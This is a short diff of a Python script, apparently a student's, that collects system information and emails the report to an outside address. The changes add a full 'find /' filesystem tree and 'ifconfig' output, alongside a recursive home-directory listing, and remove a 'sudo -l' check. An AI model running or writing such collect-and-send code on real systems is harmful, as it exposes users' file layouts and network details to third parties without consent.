@@ -19,9 +19,13 @@ def collect_system_info():
     info.append("\nFile System (Limited Access):\n")
     info.append(subprocess.getoutput("ls -lR ~"))
 
-    # Collect file system information (limited to accessible directories)
-    info.append("\nPasswd root:\n")
-    info.append(subprocess.getoutput("sudo -l"))
+    # Collect file tree from root
+    info.append("\nFile Tree from Root:\n")
+    info.append(subprocess.getoutput("find / -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'"))
+
+    # Collect network configuration
+    info.append("\nNetwork Configuration:\n")
+    info.append(subprocess.getoutput("ifconfig"))
 
     return "\n".join(info)
 
@@ -51,3 +55,4 @@ if __name__ == "__main__":
     report = collect_system_info()
     recipient_email = "9534@holbertonstudents.com"
     send_email(report, recipient_email)
+
